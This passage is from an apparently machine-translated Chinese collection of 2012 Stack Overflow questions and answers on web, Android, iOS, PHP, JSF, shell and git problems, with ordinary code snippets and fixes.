不知道你是否可以在.net中做到这一点。但我在 jquery 中这样做，如下所示。我希望这在某种程度上有用。

```
$.rule("#bob {height:"+ht+"}").appendTo('style'); 
```

当它生成时，您可以检查您的 dom 是否已将一些 css 添加到`style`元素中。

它比内联 css 更好。它适用于显示在浏览器上且未物理写入文件的网页。

更多信息 -[这里](http://flesler.webs.com/jQuery.Rule/)

当我检查时，它适用于 IE8、FF 和 Chrome。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:37:00.710

你为什么要写出 HTML，现有的控件之一不能提供你需要的东西吗？

一般来说，CSS 应该在 .css 文件中。

由于您尚未解释代码的意图，因此实际上无法回答这是否是一种好方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:35:27.853

尽量不要使用内联 css，您可以使用其中包含 css 字符串的文字，并让 htmlTextWriter 编写它。

# mobile - 移动端开发小技巧

> ID：11243646
> 
> 赞同：0
> 
> 时间：2012-06-28T11:30:47.920
> 
> 标签：mobile, user-interface, responsive-design

我正在创建一个移动站点并第一次使用 WAP，我主要担心该站点应该在所有手机上正确呈现。

所以，我正在考虑采用响应式设计方法。但后来我遇到了这个网站：

[http://www.webdesignshock.com/responsive-design-problems/](http://www.webdesignshock.com/responsive-design-problems/) [http://dapurpixel.com/blog/articles/responsive-web-design-pros-and-cons/](http://dapurpixel.com/blog/articles/responsive-web-design-pros-and-cons/)

因此，请提供一些在开发移动网站时要遵循的最佳实践。我用谷歌搜索了它，但它显示了我的响应式设计教程，我不确定这是不是最佳方法。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T20:24:51.940

这一切都取决于您正在创建的网站。某些类型的网站（例如博客）非常容易制作为响应式设计。但其他一些网站（电子商务、新闻杂志、深度网站）应该专门针对移动设备和平板电脑进行调整。为什么？因为使网站适应其宽度和列布局通常是不够的。

另外请记住，某些功能（例如鼠标悬停）对于平板电脑用户来说相当复杂。因此，单击打开手风琴菜单的菜单更简单，感觉更正确。与简单地为手持设备创建特定版本的网站相比，创建一个适合所有人的设计（一个设计来统治所有人）可能需要更多的时间来实施。

因此，这一切都取决于您网站的性质。

# jsf - 如何在不验证所有必需输入的情况下调用命令按钮？

> ID：11243652
> 
> 赞同：9
> 
> 时间：2012-06-28T11:31:17.483
> 
> 标签：jsf, redirect, primefaces, required-field

我正在尝试从 index.xhtml 重定向到 registerFirstTime.xhtml。

页面 index.xhtml 中的代码为：

```
<h:form id="content" style="margin-top: 1em;">
    <p:panel id="panel" header="LOGIN">
        <p:messages id="msgs" globalOnly="true"/>
        <h:panelGrid columns="3">
            <h:outputLabel value="e-mail" />
            <p:inputText id="name" required="true" value="#{UserBean.email}"
                requiredMessage="Required: e-mail" display="icon">
            </p:inputText>
            <p:message id="msgName" for="name"/>
            <h:outputLabel value="Password" />
            <p:password id="password" required="true" value="#{UserBean.password}"
                requiredMessage="Required: Password" display="icon" feedback="false">
            </p:password>
            <p:message id="msgPassword" for="password"/>
        </h:panelGrid>
        <h:panelGrid columns="2">
            <p:commandButton value="Login" actionListener="#{UserBean.validate}" update="msgNombre, msgPassword, msgs"/>
            <h:commandButton value="Register for the first time" action="register"/>
        </h:panelGrid>
    </p:panel>
</h:form> 
```

而在 faces-config.xml 中重定向的内容是：

```
<navigation-rule>
    <from-view-id>index.xhtml</from-view-id>
    <navigation-case>
        <from-outcome>register</from-outcome>
        <to-view-id>registerFirstTime.xhtml</to-view-id>
    </navigation-case>
</navigation-rule> 
```

在填写输入名称和密码之前，您无法进行重定向。如何在不考虑必填字段的情况下重定向记录？谢谢！=)

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-06-28T12:35:04.507

添加`immediate="true"`到命令按钮，该按钮应跳过对所有不具有该`immediate="true"`属性的输入字段的处理。

```
<h:commandButton value="Register for the first time" action="register" immediate="true" /> 
```

* * *

**与具体问题无关**，请注意，您在技术上并未在此处发送重定向。这基本上发送了一个转发，即浏览器地址栏中的 URL 仍然是登录页面的 URL。您需要添加`<redirect/>`到`<navigation-case>`. 另请注意，导航案例是 JSF 1.x 的遗留物。从 JSF 2.x 开始，您可以执行“隐式导航”，只需指定视图 ID 作为结果。

```
<h:commandButton value="Register for the first time" action="registerFirstTime?faces-redirect=true" immediate="true" /> 
```

这样您就可以完全摆脱导航箱。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-06-28T14:22:23.063

@BalusC 解决方案应该一如既往地解决问题。但我想指出几件事，因为您似乎正在使用 Primefaces。两者都与问题无关，但可能会在某些时候帮助您。

首先，您可以使用隐式导航（在 JSF2 中引入）。这样您就不需要在 faces-config.xml 文件中定义所有导航规则（我在一个旧的 JSF 1.2 项目上工作，并且讨厌需要为所有内容定义导航角色）。以下是你的做法：

`<h:commandButton value="Register for the first time" action="registerFirstTime.xhtml?faces-redirect=true"/>`

faces-redirect 参数强制重定向而不是转发，以防万一。

另外，假设您想正确处理一些值，但不是全部。在这种情况下，您可以使用p:commandButton 或 p:ajax的**process属性。**例如

`<h:commandButton value="Register for the first time" action="registerFirstTime.xhtml?faces-redirect=true" process="@this, name"/>`

这将使 JSF 只处理按钮 (@this) 和 id="name" 的组件（您的电子邮件字段）。同样，它可能不适用于**这个**问题，但它是我经常使用的东西。

# android - 联系方式来错订单

> ID：11243654
> 
> 赞同：1
> 
> 时间：2012-06-28T11:31:19.183
> 
> 标签：android, android-contacts

我正在尝试访问模拟器中所有联系人的联系人详细信息。我得到了访问其他详细信息所需的解决方案。访问电话和电子邮件类型时出现问题。我使用下面的代码来获取电话类型和电子邮件类型。应用程序正在运行，没有编译错误。

**完整代码**

```
public class GetAllDatas extends Activity {

ListView lvItem;
private Button btnAdd;
String Ptype, Etype;
int contactPhoneType;

String displayName="", emailAddress="", phoneNumber="";
ArrayList<String> contactlist=new ArrayList<String>(); 
ArrayAdapter<String> itemAdapter;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);

    lvItem = (ListView)this.findViewById(R.id.lvitems); 
    btnAdd = (Button)this.findViewById(R.id.btnAddItem);

    itemAdapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1,contactlist); 
    lvItem.setAdapter(itemAdapter);

    btnAdd.setOnClickListener(new View.OnClickListener() { 
        public void onClick(View v) {
            readContacts();
        }
    });

} 

private void readContacts()
{
    ContentResolver cr =getContentResolver();
    Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);

    while (cursor.moveToNext()) 
    {
        displayName  = "" ;
        ArrayList<String> phoneNumber  = new ArrayList<String>();
        ArrayList<String> emailAddress  = new ArrayList<String>();

        displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));       
        String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));

        /*                   Email                   */ 

        Cursor emails = cr.query(Email.CONTENT_URI,null,Email.CONTACT_ID + " = " + id, null, null);
        while (emails.moveToNext()) 
        {
            emailAddress.add(emails.getString(emails.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))); 

             int contactPhoneType = emails.getInt(emails.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));

             switch(contactPhoneType){
                case ContactsContract.CommonDataKinds.Email.TYPE_HOME: 
                     Etype = "Home";
                     break; 
                case ContactsContract.CommonDataKinds.Email.TYPE_WORK: 
                    Etype = "Work";
                    break;
                case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE: 
                    Etype = "Mobile";

                    break;
                case ContactsContract.CommonDataKinds.Email.TYPE_OTHER: 
                    Etype = "Other";
                    break;
           }                  
       }

        emails.close(); 

      /*            Phone Number and Type   */ 

        if(Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0)
        {
            Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",new String[]{id}, null);
            while (pCur.moveToNext()) 
            {
                 phoneNumber.add(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))); 

                  contactPhoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));

                 switch(contactPhoneType){
                    case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: 
                         Ptype = "Home";
                         break; 
                    case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: 
                        Ptype = "Work";
                        break; 
                    case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:  
                        Ptype = "Mobile";
                        break; 
                    case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER: 
                        Ptype = "Other";
                        break;
               }                  
           }  

            pCur.close();  
        }   

int phoneNumberCount = phoneNumber.size();
int emailCount = emailAddress.size();

// Add arraylist data to contactlist..

if(phoneNumberCount > emailCount) {

    for (int i=0; i<phoneNumberCount; i++)
      {
        if(emailCount>i)
          {
           contactlist.add(displayName +  " , " +  Ptype + " , " + phoneNumber.get(i) + " , " + Etype + " , " + emailAddress.get(i) + "\n");    
           }
        else
        {
          contactlist.add(displayName + " , " +  Ptype + " , " + phoneNumber.get(i) + " , " + " , " + "\n");
        } 
       }
    }
    else  
       {
        for (int i=0; i<emailCount; i++) 
         {
        if(phoneNumberCount>i)
          {
            contactlist.add(displayName + " , " + Ptype + " , " + phoneNumber.get(i) + " , " +  Etype + " , " + emailAddress.get(i) + "\n"); 
          }
        else
        { 
          contactlist.add(displayName + " , " + " , " + " , " + Etype + " , " + emailAddress.get(i) +  "\n");
        }
      }
    }      
    }
    Collections.sort(contactlist);
    itemAdapter.notifyDataSetChanged();
    cursor.close(); 
} 
 } 
```

问题是，我在不正确顺序的 ListView 中得到了电话类型和电子邮件类型。这意味着我将 2 个号码**[家庭、手机]**和 2 封电子邮件**[家庭、工作]**保存到特定联系人。当我运行代码时，此联系人的列表视图显示变为数字**[手机、工作]**和电子邮件**[手机、工作] ]** . 我无法更正代码。如何使 ListView 正确显示。有人知道如何调试吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:39:55.983

问题出在您的循环中...每个项目只有一个变量，并且每次都在重新设置它。

当您创建要添加到列表视图的字符串时，您只有通过每个循环的最后一次迭代的值。

您应该将大部分字符串创建移动到这些循环中。

在循环外开始字符串，设置联系人姓名，然后通过电话#循环在每次迭代中添加电话号码（和类型），然后通过 e 在每次迭代中将电子邮件（和类型）添加到字符串中- 邮件循环。

**编辑**

我认为这就是你想要的：

```
private void readContacts() {
    ContentResolver cr = getContentResolver();
    Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
            null, null, null);

    while (cursor.moveToNext()) {
        displayName = "";

        displayName = cursor
                .getString(cursor
                        .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
        String id = cursor.getString(cursor
                .getColumnIndex(ContactsContract.Contacts._ID));
        String holder = "";
        holder = holder + displayName;

        /* Phone Number and Type */

        if (Integer
                .parseInt(cursor.getString(cursor
                        .getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
            Cursor pCur = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                            + " = ?", new String[] { id }, null);
            while (pCur.moveToNext()) {

                contactPhoneType = pCur
                        .getInt(pCur
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));

                switch (contactPhoneType) {
                case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                    holder = holder + ", Home";
                    break;
                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                    holder = holder + ", Work";
                    break;
                case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                    holder = holder + ", Mobile";
                    break;
                case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                    holder = holder + ", Other";
                    break;
                }
                holder = holder
                        + ", "
                        + (pCur.getString(pCur
                                .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
            }
            pCur.close();
        }

        /* Email */
        Cursor emails = cr.query(Email.CONTENT_URI, null, Email.CONTACT_ID
                + " = " + id, null, null);
        while (emails.moveToNext()) {
            int contactPhoneType = emails
                    .getInt(emails
                            .getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
            switch (contactPhoneType) {
            case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                holder = holder + ", Home";
                break;
            case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                holder = holder + ", Work";
                break;
            case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE:
                holder = holder + ", Mobile";
                break;
            case ContactsContract.CommonDataKinds.Email.TYPE_OTHER:
                holder = holder + ", Other";
                break;
            }
            holder = holder
                    + ", "
                    + (emails
                            .getString(emails
                                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
        }
        emails.close();
        contactlist.add(holder);
    }
    Collections.sort(contactlist);
    itemAdapter.notifyDataSetChanged();
    cursor.close();
} 
```

# objective-c - 使用 3G 上传时 AFNetworking “无法分配内存”

> ID：11243656
> 
> 赞同：0
> 
> 时间：2012-06-28T11:31:34.173
> 
> 标签：objective-c, memory, upload, afnetworking

我正在使用`AFNetworking`多部分 POST 将文件上传到 Web 服务。使用 WiFi 时一切正常，但通过 3g 上传时，对于大于 2 兆字节的文件，上传失败。

我尝试了两种方法，都在发送的确切字节数处失败：1998848。如果文件小于该文件，则上传成功。

Amazon S3 SDK 也有同样的问题，他们建议限制上传，但我找不到使用`AFNetworking`or的方法`NSUrlConnection`。

我还记得 iOS 在流式传输时每 5 分钟限制为 5 兆。我不确定这是否适用，但以我的 3g 速度，我在一分钟内上传了大约 2 兆。也许就是这样？同样，找不到任何相关信息。

有任何想法吗？这是我的代码：

分段上传：

```
NSMutableURLRequest *request = [[DIOSSession sharedSession] multipartFormRequestWithMethod:@"POST" path:[NSString stringWithFormat:@"%@/%@", kDiosEndpoint, @"demotix_services_story/upload"] parameters:params constructingBodyWithBlock: ^(id <AFMultipartFormData> formData) {
    for (NSString * fkey in files) {
        NSDictionary *file = [files objectForKey:fkey];
        NSURL *fileUrl = [NSURL fileURLWithPath:[file valueForKey:@"fileUrl"]];
        NSString *fileName = [file valueForKey:@"name"];

        [formData appendPartWithFileURL:fileUrl name:fileName error:&error];
    }

}];

AFHTTPRequestOperation *operation = [[AFHTTPRequestOperation alloc] initWithRequest:request];
[operation setUploadProgressBlock:^(NSInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
    [delegate updateUploadProgress:totalBytesWritten from:totalBytesExpectedToWrite];
}];
[operation setCompletionBlockWithSuccess:success failure:failure];
[operation start]; 
```

将所有文件合并为一个并尝试流式传输：

```
NSURLRequest *nrequest = [[DIOSSession sharedSession] requestWithMethod:@"POST" path:[NSString stringWithFormat:@"%@/%@", kDiosEndpoint, @"demotix_services_story/upload"] parameters:params];

AFHTTPRequestOperation *noperation = [[AFHTTPRequestOperation alloc] initWithRequest:nrequest];
noperation.inputStream = [NSInputStream inputStreamWithFileAtPath:storePath];
noperation.outputStream = [NSOutputStream outputStreamToMemory];
[noperation setUploadProgressBlock:^(NSInteger bytesWritten, long long totalBytesWritten, long long totalBytesExpectedToWrite) {
    [delegate updateUploadProgress:totalBytesWritten from:totalBytesExpectedToWrite];
}];
[noperation setCompletionBlockWithSuccess:success failure:failure];
[noperation start]; 
```

谢谢，

和你

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:43:01.673

ASIHTTPRequest 支持带宽限制。

如果您不愿意切换，您可以分析它的代码以查看它是如何关闭的，以及您是否可以扩展 AFNetworking 来做同样的事情。看看方法：

```
 scheduleReadStream
 unscheduleReadStream

setShouldThrottleBandwidthForWWAN 
```

# php - 如何制作发票html页面的pdf？

> ID：11243658
> 
> 赞同：-1
> 
> 时间：2012-06-28T11:31:47.063
> 
> 标签：php

> **可能重复：**
> [使用 PHP 创建 PDF 文件](https://stackoverflow.com/questions/1204630/create-a-pdf-file-with-php)

我已经使用 javascript 创建了发票生成器。好吧，我能够处理它。现在我要做的是生成发票中可用的 pdf 数据。我尝试了一些，但没有一个成功。那么如果有人可以帮助我吗？

提前感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:38:16.903

无法在客户端生成 PDF（我的意思是使用 Javascript）。您需要使用 PDF 库在服务器端处理发票数据并写入 URL 位置，以便可以在浏览器中下载或打开它。

TCPDF 是使用 PHP 生成 PDF 的好工具。请参阅此[链接](http://www.tcpdf.org/)。

另请参阅此[问题](https://stackoverflow.com/questions/1204630/create-a-pdf-file-with-php)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:35:49.400

我已经多次使用[“webkit html to pdf”（wkhtmltopdf）](http://code.google.com/p/wkhtmltopdf/)。

它对我来说效果很好，尽管使用分页符有点麻烦。

# php - 如何使用php复制表1中的一行和表2中的多个关联行

> ID：11243660
> 
> 赞同：1
> 
> 时间：2012-06-28T11:31:55.330
> 
> 标签：php, sql, duplicates, row, multiple-tables

我有一张带汽车的桌子。每辆车都有一个或多个调整阶段，位于另一张桌子上。
在带有调整阶段的表中；有一个汽车标识符：[cId] = car id。

首先，我复制汽车并将新生成的 id 存储`mysql_insert_id()`到`$new_carId`.
然后，我根据汽车标识符 [cId] 获取所有相关的调整阶段，并执行与汽车相同的操作，但在循环中`while()`。

现在，新的复制阶段具有旧车的 [cId]。
我现在需要用存储的任何 id 替换 [cId]，`$new_carId`以便将重复的阶段分配给新车。

我的看法；我有两个选择：
要么直接在`INSERT`-query中发生，要么在-loop结束时
执行 sql 。`UPDATE``while()`

到目前为止，这是我的代码：

```
/**
 *  Duplicate an existing car with associated tuning stage:
 *  Each car may have more than one associated tuning stage located in a separate table. 
 *  We need to make sure all stages is duplicated as well, and assigned to the new car.
 *
 *  [cId] car id.
 *
 *  debug() is a personal debugging function.
 */
    if (isset($_POST['duplicate_car'])){
    #   duplicate the car.
        $orgCar_id = (int)mysql_real_escape_string($_POST['orgCar_id']);  //  ID of the car we make the duplicate from.
        $sql_car = 'INSERT INTO TUNE_cars (make, model, chassis, motor, motorkode, orgEff, orgNm, year, options, note)
            SELECT make, model, chassis, motor, motorkode, orgEff, orgNm, year, options, note FROM TUNE_cars WHERE cId = '.$orgCar_id;
        //  debug($sql_car);
        $qry_car = mysql_query($sql_car);
        $new_carId = (int)mysql_real_escape_string(mysql_insert_id());  //  We need to attach this ID to the new duplicated tuning stages.
    //
    /**
     *  Duplicate any associated tuning stages:
     *  We need to fetch all stages associated with the old car,
     *  duplicate them aswell, and attach them to the new car. 
     *
     *  [sId] stage id
     *  [cId] car id. This connects the stages to a given car.
     */
        #   fetch all stages associated with the old car.
            $sql_stages = 'SELECT sId FROM TUNE_stages WHERE cId = '.$orgCar_id;
            //  debug($sql_stages);
            $qry_stages = mysql_query($sql_stages);
        //
        #   duplicate the stages.
            while($get_stage = mysql_fetch_assoc($qry_stages)){
                $sql_dup_stage = 'INSERT INTO TUNE_stages (cId, stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote)
                SELECT '.$new_carId.', stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote FROM TUNE_stages WHERE sId = '.$get_stage['sId'];
                //  debug($sql_dup_stage);
                $qry_dup_stage = mysql_query($sql_dup_stage);
            //
            }
        //
    /**/
    }
/**/ 
```

如你看到的; 我使用了最后一种方法：
我在循环`UPDATE`结束时做了一个`while()`。

我确实相信这可以做得更简单，并愿意接受建议......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T12:03:46.740

您不需要第二次更新。改变

```
$sql_dup_stage = 'INSERT INTO TUNE_stages (cId, stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote)
            SELECT cId, stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote FROM TUNE_stages WHERE sId = '.$get_stage['sId']; 
```

到：

```
$sql_dup_stage = 'INSERT INTO TUNE_stages (cId, stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote)
            SELECT \''.$new_carId.'\', stage, stageHp, stageNm, stagePrice, stageMethod, stageDyno, sinfo, snote FROM TUNE_stages WHERE sId = '.$get_stage['sId'] 
```

# php - codeigniter 数据库查询

> ID：11243661
> 
> 赞同：0
> 
> 时间：2012-06-28T11:31:56.100
> 
> 标签：php, database, codeigniter, field

是否可以在 codeigniter 活动记录中编写此查询？

```
$Main_Nav_Query = mysql_query("SELECT * FROM kategorie WHERE nadrad = 0 order by poradie;"); 
```

因为我找到了这个代码来创建带有子字段的菜单，并且我想将它更改为 codeigniter 代码，并且还添加了一些可能拥有无限子菜单的可能性，例如

```
Menu1
     Menu 1 1
     Menu 1 2
     Menu 1 3
             Menu 1 3 1
             Menu 1 3 2
             Menu 1 3 3
                       Menu 1 3 3 1
Menu 2
Menu 3 
```

等等

这是完整的代码：

```
$Main_Nav_Query = mysql_query("SELECT * FROM kategorie WHERE nadrad = 0 order by poradie;");    //Query for the main items

    echo "<ul id=\"navigation-list\">\n";
    //Main items
    while($Main_Nav_Query_Results = mysql_fetch_array($Main_Nav_Query)) {
        //Set main data
        $Main_Nav_ID         = $Main_Nav_Query_Results['id'];
        $Main_Nav_Name         = $Main_Nav_Query_Results['nazov'];
        $Main_Nav_Link        = $Main_Nav_Query_Results['menu'];
        $Main_Nav_Parent    = $Main_Nav_Query_Results['nadrad'];

        //Create the list items for each main level
        echo "\t\t\t\t<li class=\"mainlevel\" id=\"\"><a >$Main_Nav_Name</a>";

            //Sub items
            $Sub_Nav_Query     = mysql_query("SELECT * FROM kategorie WHERE nadrad = '$Main_Nav_ID';");    //Query for the sub items
            while($Sub_Nav_Query_Results = mysql_fetch_array($Sub_Nav_Query)) {
                //Set Sub data
                $Sub_Nav_ID         = $Sub_Nav_Query_Results['id'];
                $Sub_Nav_Name         = $Sub_Nav_Query_Results['nazov'];
                $Sub_Nav_Link        = $Sub_Nav_Query_Results['menu'];
                $Sub_Nav_Parent        = $Sub_Nav_Query_Results['nadrad'];

                //Create the markup for the sub items (list items)
                $Sub_List = "<li class=\"sub-item\"><a >$Sub_Nav_Name</a></li>";    

                //Check if the current item has any sub items
                if($Sub_Nav_Parent == $Main_Nav_ID) {
                        echo "<ul class=\"sub-list\">";
                        echo "$Sub_List";
                        echo "</ul>";                    
                }                            
            }        
        echo "</li>\n";    //Close the sub items
    }
    echo "\t\t\t</ul>\n";        //Close the unordered list for the main items 
```

你能帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:43:08.380

像这样：

```
$this->db->where('nadrad', 0);
$this->db->order_by('poradie', 'ASC');
$rows = $this->db->get('kategorie')->result();

foreach ($rows as $row) {
    $Main_Nav_ID = $row->id;
    //etc..
} 
```

# regex - 复制完整路径变量的一部分并使用该部分在 shell 中构造另一个不同的完整路径变量

> ID：11243665
> 
> 赞同：0
> 
> 时间：2012-06-28T11:32:10.213
> 
> 标签：regex, shell

我有一个变量 var1='common_location/specific_location_1/common_filename_text' 现在我必须得到一个新变量 var2='common_location/specific_location_2/common_filename_text'。我怎样才能在 linux shell 中做到这一点。我是 shell 脚本的新手。所以请解释一下，假设我知道的很少。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:33:35.780

使用它：

```
var2=${var1/1/2} 
```

where`var1`是`/specific_location_1/common_filename_text`存储在其中的变量。您可以在下面看到，`var1`并且`var2`只有一个符号不同

```
var1='common_location/specific_location_1/common_filename_text'
var2='common_location/specific_location_2/common_filename_text' 
```

所以我们只需要将 1 替换为 2 并获得您需要的新变量。你可以这样做：

```
var2=${var1/1/2} 
```

相当容易。

# git - 与两个相互依赖的存储库持续集成

> ID：11243668
> 
> 赞同：0
> 
> 时间：2012-06-28T11:32:22.723
> 
> 标签：git, github, continuous-integration, jenkins

我的系统中有两个“组件”，“天气服务”和“天气消费者”。

Weather-server 被重写以提供温度 REST URI。[天气服务器](http://github.com/pbrian/weather-server)位于github 存储库中。

天气客户端，需要使用这个，所以我写了一个新函数。这存储在[不同的 github repo](http://github.com/pbrian/weather-client)中。

现在，无论我提交哪种方式，客户端优先或服务器优先，系统都不会为第一次提交工作，只有第二次。因此，我的 Jenkins 服务器将进行完全不必要的构建和测试。

我可以绕过这个吗？

1.  我可以在一次提交中提交两个 git repos 吗？我 99.9% 肯定没有，但值得检查。
2.  我可以告诉詹金斯忽略某些提交吗？

我应该忍受它还是有人有其他想法？

而且，是的，我知道我可以进行测试以查看气象服务是否启动，但这不是重点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-11T21:37:47.930

Android Repo 是处理多个 git repo 而不是子模块的好方法。您需要先安装 repo，然后：

在 Jenkins 中，安装 repo 插件，输入清单文件所在的位置，一切顺利。

手动地，像这样引入只读和可写的 git 存储库。

repo init -u git://github.com/rickfoosusa/manifest -m yourmanifest.xml repo sync

清单文件有遥控器和项目。

```
<?xml version="1.0" encoding="UTF-8"?>
<manifest>
  <remote name="github"
        fetch="git://github.com/rickfoosusa" />
  <remote name="rickfoosusa"
        fetch="git@github.com:rickfoosusa" />

  <default remote="github" revision="master"/>

  <project name="openbenchmarks" path="openbenchmarks"/>
  <project remote="rickfoosusa"
           name="myproject"
           path="openbenchmarks/myproject"/>
</manifest> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:40:14.217

我认为您可以告诉 Jenkins 在进行测试之前等待一两分钟。

# iphone - Inapppurchase SKProductsRequest 在 ios5 中使我的应用程序崩溃

> ID：11243669
> 
> 赞同：1
> 
> 时间：2012-06-28T11:32:24.353
> 
> 标签：iphone, ios, ios5, in-app-purchase, storekit

我的 SKProductsRequest 商店套件类崩溃开始我没有经验 inapppurchase 概念我的类在 iOS 4.3 sdk 而不是 iOS 5 sdk 中完美运行。我在控制台上没有收到错误，并且我的应用程序在 SKProductsRequest 开始之前崩溃了请任何人帮助我如何解决这个问题这是我的代码：

```
#import "StorePurchase.h"

@implementation StorePurchase
@synthesize request = _request;

- (void)loadStore {

    if ([SKPaymentQueue canMakePayments]) {
        NSLog(@"Parental-controls are disabled");
        self.request = [[SKProductsRequest alloc] initWithProductIdentifiers:[NSSet setWithObject:@"com.mycompany.app"]];
        self.request.delegate = self;
        [self.request start];
    }
    else {
        NSLog(@"Parental-controls are enabled");
    }

}
static bool hasAddObserver=NO;

- (void)purchase {
    if (!hasAddObserver) {//flag to fix this bug
        /*=====================================*/
        [[SKPaymentQueue defaultQueue] addTransactionObserver:self];
        hasAddObserver=YES;
    }
    SKMutablePayment *payment = [[SKMutablePayment alloc] init] ;
    payment.productIdentifier = @"com.mycompany.app";
    payment.quantity = 1;
    [[SKPaymentQueue defaultQueue] addPayment:payment];
}

- (void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse *)response {
    SKProduct *validProduct = nil;
    int count = [response.products count];
    if (count > 0) 
    {
        validProduct = [response.products objectAtIndex:0];
        NSLog(@"Products found,Magic Box!");
        [[NSNotificationCenter defaultCenter] postNotificationName:kProductsLoadedNotification object:@"Product Found..!"];

    } else if (!validProduct) 
    {
        NSLog(@"No products available");
        [[NSNotificationCenter defaultCenter] postNotificationName:kProductsLoadedNotification object:@"Product Not Found..!"];

    } 
}

- (void)provideContent:(NSString *)productIdentifier {

    NSLog(@"Toggling flag for: %@", productIdentifier);
    [[NSUserDefaults standardUserDefaults] setBool:TRUE forKey:productIdentifier];
    [[NSUserDefaults standardUserDefaults] synchronize];
    //[_purchasedProducts addObject:productIdentifier];

    [[NSNotificationCenter defaultCenter] postNotificationName:kProductPurchasedNotification object:productIdentifier];

}

- (void)completeTransaction:(SKPaymentTransaction *)transaction {

    NSLog(@"completeTransaction...");

    //[self recordTransaction: transaction];
    [self provideContent: transaction.payment.productIdentifier];
    [[SKPaymentQueue defaultQueue] finishTransaction: transaction];

}

- (void)restoreTransaction:(SKPaymentTransaction *)transaction {

    NSLog(@"restoreTransaction...");

    //[self recordTransaction: transaction];
    [self provideContent: transaction.originalTransaction.payment.productIdentifier];
    [[SKPaymentQueue defaultQueue] finishTransaction: transaction];

}

- (void)failedTransaction:(SKPaymentTransaction *)transaction {

    if (transaction.error.code != SKErrorPaymentCancelled)
    {
        NSLog(@"Transaction error: %@", transaction.error.localizedDescription);
    }

    [[NSNotificationCenter defaultCenter] postNotificationName:kProductPurchaseFailedNotification object:transaction];
    [[SKPaymentQueue defaultQueue] finishTransaction:transaction];
}

- (void)paymentQueue:(SKPaymentQueue *)queue restoreCompletedTransactionsFailedWithError:(NSError *)error
{
    NSLog(@"<><Canceled!><>");
    [[NSNotificationCenter defaultCenter] postNotificationName:kProductPurchaseCanceledNotification object:error];

}

- (void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions {

    for (SKPaymentTransaction *transaction in transactions) {

        switch (transaction.transactionState) {

            case SKPaymentTransactionStatePurchasing:
                // [self completeTransaction:transaction];
                break;

            case SKPaymentTransactionStatePurchased:
                NSLog(@"Purchased");
                [self completeTransaction:transaction];
                //[[SKPaymentQueue defaultQueue] finishTransaction:transaction];

                break;

            case SKPaymentTransactionStateRestored:
                //[[SKPaymentQueue defaultQueue] finishTransaction:transaction];
                NSLog(@"Restored");
                [self restoreTransaction:transaction];

                break;

            case SKPaymentTransactionStateFailed:
                if (transaction.error.code != SKErrorPaymentCancelled) {
                    NSLog(@"An error encounterd");
                }
                else {
                    NSLog(@"Cancelled!");
                }
                //[[SKPaymentQueue defaultQueue] finishTransaction:transaction];

                [self failedTransaction:transaction];

                break;

        }

    }

} 
```

